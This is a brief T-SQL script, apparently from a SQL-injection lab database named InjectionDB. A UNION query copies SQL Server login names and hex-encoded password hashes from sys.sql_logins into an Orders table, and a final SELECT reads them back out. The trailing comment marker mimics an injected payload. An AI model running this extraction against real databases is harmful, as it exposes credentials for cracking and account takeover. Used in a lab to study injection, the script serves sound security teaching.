SET NOCOUNT ON
USE InjectionDB
GO

INSERT INTO Orders 
SELECT
    4,
    principal_id+1000,
    principal_id,--*1.0,
    name
FROM sys.sql_logins

UNION

SELECT
    5,
    principal_id+1000,
    principal_id,--*1.0,
    master.dbo.fn_varbintohexstr(password_hash)
FROM sys.sql_logins-- 

SELECT *
FROM dbo.Orders
ORDER BY OrderID DESC
